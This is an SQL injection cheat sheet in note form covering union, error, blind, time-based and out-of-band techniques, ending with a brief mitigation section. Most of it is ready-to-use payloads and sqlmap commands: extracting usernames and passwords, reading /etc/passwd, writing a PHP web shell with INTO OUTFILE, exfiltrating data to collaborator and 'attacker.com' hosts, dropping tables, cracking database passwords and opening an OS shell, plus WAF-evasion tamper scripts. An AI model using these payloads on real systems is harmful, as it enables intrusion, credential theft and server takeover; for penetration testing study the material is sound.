# SQL Injection

## Types of SQL Injections

* `In-band` SQL injection, and it has two types: `Union Based` and `Error Based`.
  * Output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
* `Blind` SQL injection, and it also has two types: `Boolean Based` and `Time Based`.
  * We may not get the output printed, so we may utilize SQL logic to retrieve the output character by character.
* `Out-of-band` SQL injection
  * We may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.

## Detect SQL Injection Vulnerabilities

* Injection Characters: `'` , `"`, `#`, `;`, `)` , `—` , `%27`, `%22`, `%23`, `%3B`, `%29` <sup><sub>(Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.)<sub></sup>
* SQL-specific syntax(ASCII(97)), `OR 1=1` , `' or '1'='1`
* Trigger time delays, OAST payloads to trigger out-of-band interaction

## Second-Order SQL injection

* First-order SQL injection arises where the application takes user input from an HTTP request
* Second-order (stored SQLi), takes user input from an HTTP request and stores it for future use.
* The DB when fetching from stored values might not perform any additional sanitization and the attacker will be able to see output in another page.
* Payload injected in a particular HTTP Request, but the effect is not visible in the same response but somewhere else within the application where this query is processed and details are retrieved.

## Retrieving Hidden Data

* Use comments syntax to change the logic (`'—` )
* Use `' OR 1=1--` , `'+OR+1=1--` <sup><sub>(should end with space character)<sub></sup>

## Subverting Application Logic

* In case of username and password -> changing logic to only check the username and ignore the password

## Retrieving Data from other Database Tables

* Use `UNION` keyword
* UNION Attacks - retrieve data from other tables -> appends one or more queries to original query

#### Requirements

* Individual queries must have the same number of columns
* Data types in each column must be compatible

## Determine the Number of Columns being Displayed using `ORDER BY`

* `'+ORDER+BY+1--` <sup><sub>(keep incremeting the value)<sub></sup>
* `'+UNION+SELECT+NULL,NULL--` <sup><sub>(append more<sub></sup> <sup><sub>`NULL`<sub></sup> <sup><sub>if required)<sub></sup>
* Reason for using NULL is because it should be compatible with the data types

## Determine the Data Type of Column

* `'+UNION+SELECT+'A',NULL,NULL--`
* Keep changing the position of string and Increase or decrease NULL values

## Retrieving Multiple Values within Single Column

* Retrieve multiple values within this single column by concatenating the values together
* `'+UNION+SELECT+username+||+'~'+||+password+FROM+users--`
* eg: oracle database uses `||` for string concatenation -> change accordingly

## Examining Database Details

* Depending on DB version query changes
* For Oracle - requires `FROM` keyword as a must
* Use Burp SQL injection cheat sheet

## Reading Files <a href="#reading-files" id="reading-files"></a>

* We can start looking for what privileges we have with that user.
  * `SELECT super_priv FROM mysql.user`
  * `SELECT grantee, privilege_type FROM information_schema.user_privileges`
* If `FILE` privilege is listed for our user, enables us to read files. <sup><sub>(eg for MySQL)<sub></sup>
* `SELECT LOAD_FILE('/etc/passwd');` <sup><sub>(Might need to provide full path)<sub></sup>
* Example Payload: `' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` , `' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

## Writing Files <a href="#writing-files" id="writing-files"></a>

* To be able to write files to the back-end server using a MySQL database, we require three things:
  1. User with `FILE` privilege enabled
     1. `SELECT super_priv FROM mysql.user`
     2. `SELECT grantee, privilege_type FROM information_schema.user_privileges`
  2. MySQL global `secure_file_priv` variable not enabled
     1. `SHOW VARIABLES LIKE 'secure_file_priv';` <sup><sub>(The<sub></sup> [<sup><sub>secure\_file\_priv<sub></sup>](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) <sup><sub>variable is used to determine where to read/write files from.)<sub></sup>
     2. `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
  3. Write access to the location we want to write to on the back-end server
* `SELECT * from users INTO OUTFILE '/tmp/credentials';`
* `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`
* `select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'-- -`

## Blind SQL Injection Detection

* Trigger a detectable difference in the application's response depending on the true/false of a single condition.
* Trigger a time delay in the processing of the query
* Trigger an out-of-band network interaction, using OAST techniques.

## Exploiting Blind SQL Injection by Triggering Conditional Responses

* Works only if there is some kind of difference in the response
* eg: trackingID cookie
* `xyz' AND '1'='1 , xyz' AND '1'='2`
* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
* `SUBSTRING` method used is different depending on DB version
* make use of `length()` and `substring()`
* In intruder there is an option grep-match - provide the difference in response message

## Exploiting Blind SQL Injection by Inducing Conditional Responses by Triggering SQL Errors

* Works only if error handling mechanism is not defined
* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
* Here if the condition is true it will throw an error for division by zero
* use `substring()` and `length()` to know about the details that is to be fetched
* In intruder look for 500 status code

## Exploiting Blind SQL Injection by Triggering Time Delays

* If error handling mechanism is defined
* Triggering time delays conditionally, depending on an injected condition
* `'; IF (1=2) WAITFOR DELAY '0:0:10'--`
* `'; IF (1=1) WAITFOR DELAY '0:0:10'--` (triggers a delay of 10 seconds)
* Time delay function varies depending on DB version
* In resource pool change max concurrent requests to 1 and in results -> column -> response received/completed -> look for the number matching the time delay

## Exploiting Blind SQL Injection using Out-of-Band (OAST) techniques

* When SQL queries are not executed synchronously
* Make use of burp collaborator or [interactsh](https://github.com/projectdiscovery/interactsh)
* Cmd varies according to version of DB
* If sql query is executed asynchronously -> use this method
* `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`
* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`
* `LOAD_FILE(CONCAT('\\',@@version,'.attacker.com\README.txt'))`

## Bypass WAF using Hackvertor

* Encode -> dec\_entities/hex\_entities

## SQLMAP Techniques

* The technique characters `BEUSTQ` refers to the following:
  * `B`: Boolean-based blind <sup><sub>(<sub></sup><sup><sub>`AND 1=1`<sub></sup><sup><sub>)<sub></sup>
  * `E`: Error-based <sup><sub>(<sub></sup><sup><sub>`AND GTID_SUBSET(@@version,0)`<sub></sup><sup><sub>)<sub></sup>
  * `U`: Union query-based <sup><sub>(<sub></sup><sup><sub>`UNION ALL SELECT 1,@@version,3`<sub></sup><sup><sub>)<sub></sup>
  * `S`: Stacked queries <sup><sub>(<sub></sup><sup><sub>`; DROP TABLE users`<sub></sup><sup><sub>)<sub></sup>
  * `T`: Time-based blind <sup><sub>(<sub></sup><sup><sub>`AND 1=IF(2>1,SLEEP(5),0)`<sub></sup><sup><sub>)<sub></sup>
  * `Q`: Inline queries <sup><sub>(<sub></sup><sup><sub>`SELECT (SELECT @@version) from`<sub></sup><sup><sub>)<sub></sup>

## SQL Comands

### Basic

* `sqlmap -r req.txt --batch --dump`
* `sqlmap -r req.txt --batch --dump --level 5 --risk 3`
* `sqlmap -r req.txt --banner --current-user --current-db --is-dba`
* `sqlmap -r req.txt --tables -D <DB-Name>`
* `sqlmap -r req.txt -D <DB-Name> -T <Table-Name> --batch --dump`
* `sqlmap -r req.txt --batch --dump-all`
* `sqlmap -r req.txt --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t` <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>

### Prefix/Suffix

* `sqlmap -r req.txt --prefix="%'))" --suffix="-- -" --batch --dump`

### UNION Columns

* `sqlmap -r req.txt --technique=U --union-cols=5 --dump` <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>

### Search Database, Column, Table Names

* `sqlmap -r req.txt --search -C style --batch`
* `sqlmap -r req.txt --search -T user`

### DB Schema <a href="#db-schema-enumeration" id="db-schema-enumeration"></a>

* `sqlmap -r req.txt" --schema`

### DB Password Enumeration & Cracking <a href="#db-users-password-enumeration-and-cracking" id="db-users-password-enumeration-and-cracking"></a>

* `sqlmap -r req.txt --passwords --batch`

### Bypass Protections

* `sqlmap -r req.txt --csrf-token=<token-parameter-name> --batch --dump` <sup><sub>(Anti-CSRF Token Bypass)<sub></sup>
* `sqlmap -r req.txt --randomize=<random-parameter-name> --batch --dump` <sup><sub>(Unique Value Bypass)<sub></sup>
* `sqlmap -r req.txt --random-agent --batch --dump`
* `sqlmap -r req.txt --tamper=between --batch --dump`
* `sqlmap -r req.txt --eval="import hashlib; h=hashlib.md5(<parameter-name>).hexdigest()" --batch` <sup><sub>(Calculated Parameter Bypass)<sub></sup>

### Read Files

* `sqlmap -r req.txt --file-read "/var/www/html/flag.txt" --batch`

### Write Files

* `sqlmap -r req.txt --file-write "shell.php" --file-dest "/var/www/html/shell.php"`

### OS Exploitation

* `sqlmap -r req.txt --os-shell --technique=E --batch` <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>

### Second-Order injection

* `sqlmap -r req.txt --second-req profile.req --batch`

### Web-Socket Injection

* `sqlmap -u "ws://test.com:<port>/" --data '<body>'`

### Tamper Scripts <a href="#tamper-scripts" id="tamper-scripts"></a>

<details>

<summary><strong>Types</strong></summary>

<table data-header-hidden data-search="false"><thead><tr><th>Tamper-Script</th><th>Description</th></tr></thead><tbody><tr><td><code>0eunion</code></td><td>Replaces instances of UNION with e0UNION</td></tr><tr><td><code>base64encode</code></td><td>Base64-encodes all characters in a given payload</td></tr><tr><td><code>between</code></td><td>Replaces greater than operator (<code>></code>) with <code>NOT BETWEEN 0 AND #</code> and equals operator (<code>=</code>) with <code>BETWEEN # AND #</code></td></tr><tr><td><code>commalesslimit</code></td><td>Replaces (MySQL) instances like <code>LIMIT M, N</code> with <code>LIMIT N OFFSET M</code> counterpart</td></tr><tr><td><code>equaltolike</code></td><td>Replaces all occurrences of operator equal (<code>=</code>) with <code>LIKE</code> counterpart</td></tr><tr><td><code>halfversionedmorekeywords</code></td><td>Adds (MySQL) versioned comment before each keyword</td></tr><tr><td><code>modsecurityversioned</code></td><td>Embraces complete query with (MySQL) versioned comment</td></tr><tr><td><code>modsecurityzeroversioned</code></td><td>Embraces complete query with (MySQL) zero-versioned comment</td></tr><tr><td><code>percentage</code></td><td>Adds a percentage sign (<code>%</code>) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)</td></tr><tr><td><code>plus2concat</code></td><td>Replaces plus operator (<code>+</code>) with (MsSQL) function CONCAT() counterpart</td></tr><tr><td><code>randomcase</code></td><td>Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)</td></tr><tr><td><code>space2comment</code></td><td>Replaces space character ( ) with comments `/</td></tr><tr><td><code>space2dash</code></td><td>Replaces space character ( ) with a dash comment (<code>--</code>) followed by a random string and a new line (<code>\n</code>)</td></tr><tr><td><code>space2hash</code></td><td>Replaces (MySQL) instances of space character ( ) with a pound character (<code>#</code>) followed by a random string and a new line (<code>\n</code>)</td></tr><tr><td><code>space2mssqlblank</code></td><td>Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters</td></tr><tr><td><code>space2plus</code></td><td>Replaces space character ( ) with plus (<code>+</code>)</td></tr><tr><td><code>space2randomblank</code></td><td>Replaces space character ( ) with a random blank character from a valid set of alternate characters</td></tr><tr><td><code>symboliclogical</code></td><td>Replaces AND and OR logical operators with their symbolic counterparts (<code>&#x26;&#x26;</code> and <code>||</code>)</td></tr><tr><td><code>versionedkeywords</code></td><td>Encloses each non-function keyword with (MySQL) versioned comment</td></tr><tr><td><code>versionedmorekeywords</code></td><td>Encloses each keyword with (MySQL) versioned comment</td></tr></tbody></table>

</details>

## Mitigation

* Input Sanitization
* Input Validation
* Minimum User Privileges
* Web Application Firewall
* Parameterized Queries
  * **What it is:** A query with placeholders (`?`, `$1`, `%s`) where values are bound separately.
  * **How it works:** The application sends the SQL logic and the data as two distinct parts.
  * **Why it matters:** Prevents SQL injection because user input is treated strictly as data, not executable SQL.
  * **Performance:** May or may not reuse compiled query plans depending on the driver/database.
  * **Best use:** Everyday coding for safety and clarity when handling user input.
* Prepared Statements
  * **What it is:** A query that the database engine compiles once and stores for reuse.
  * **How it works:** SQL logic is parsed, validated, and optimized first; parameters are fed in later.
  * **Why it matters:** Faster for repeated queries since the plan is reused, and also safe against SQL injection.
  * **Performance:** Always benefits from precompilation when executed multiple times.
  * **Best use:** High‑performance scenarios where the same query runs many times with different values.
